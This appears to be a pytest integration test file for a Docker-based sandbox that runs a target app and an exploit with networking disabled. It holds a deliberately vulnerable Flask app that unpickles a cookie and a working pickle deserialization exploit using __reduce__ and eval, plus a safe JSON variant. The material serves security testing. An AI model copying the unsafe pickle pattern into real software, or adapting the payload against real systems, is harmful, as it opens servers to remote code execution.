"""
Integration tests for the Docker sealed-isolation runtime.

These run a real target app + exploit inside a `--network none` container, so
they require a working Docker daemon and the `anvil-sandbox` base image. They
auto-skip when that isn't available, so CI/machines without Docker stay green.
"""
import textwrap

import pytest

from app.container_runtime import container_isolation_available, run_app_and_exploit_sealed

pytestmark = pytest.mark.skipif(
    not container_isolation_available(),
    reason="Docker sealed isolation unavailable (no daemon / anvil-sandbox image)",
)

# Minimal vulnerable Flask app: pickle.loads on an attacker cookie.
VULN_APP = textwrap.dedent('''
    import base64, pickle
    from flask import Flask, request, jsonify
    app = Flask(__name__)

    @app.route("/")
    def index():
        return "ok"

    @app.route("/api/v1/user/preferences", methods=["GET", "POST"])
    def prefs():
        raw = request.cookies.get("session_prefs")
        if raw:
            p = pickle.loads(base64.b64decode(raw))
            theme = p.get("theme", "default") if isinstance(p, dict) else "default"
            return jsonify({"active_theme": theme})
        return jsonify({"active_theme": "default"})

    if __name__ == "__main__":
        app.run(host="127.0.0.1", port=9999)
''')

# Safe variant: JSON instead of pickle — the same exploit must NOT succeed.
SAFE_APP = VULN_APP.replace("import base64, pickle", "import base64, json") \
                   .replace("pickle.loads(base64.b64decode(raw))",
                            "(json.loads(base64.b64decode(raw)) if raw else {})")

EXPLOIT = textwrap.dedent('''
    import base64, pickle, requests
    class P:
        def __reduce__(self):
            return (eval, ("{'theme': 'PWNED_BY_ANVIL'}",))
    cookie = base64.b64encode(pickle.dumps(P())).decode()
    try:
        r = requests.post("http://127.0.0.1:9100/api/v1/user/preferences",
                          cookies={"session_prefs": cookie}, timeout=5)
        print("EXPLOIT_SUCCESS" if "PWNED_BY_ANVIL" in r.text else "EXPLOIT_FAILED")
    except Exception as e:
        print("EXPLOIT_FAILED", e)
''')


def test_sealed_container_runs_app_and_exploit(tmp_path):
    """A genuinely vulnerable app is started and exploited inside the sealed container."""
    (tmp_path / "app.py").write_text(VULN_APP, encoding="utf-8")
    res = run_app_and_exploit_sealed(repo_dir=str(tmp_path), entry_point="app.py", exploit_code=EXPLOIT)
    assert res.available
    assert res.app_started, res.error
    assert res.exploit_succeeded, res.stdout[-500:]


def test_sealed_container_reports_non_exploit(tmp_path):
    """A safe app starts but the exploit must be reported as NOT succeeding."""
    (tmp_path / "app.py").write_text(SAFE_APP, encoding="utf-8")
    res = run_app_and_exploit_sealed(repo_dir=str(tmp_path), entry_point="app.py", exploit_code=EXPLOIT)
    assert res.available
    assert res.app_started, res.error
    assert res.exploit_succeeded is False
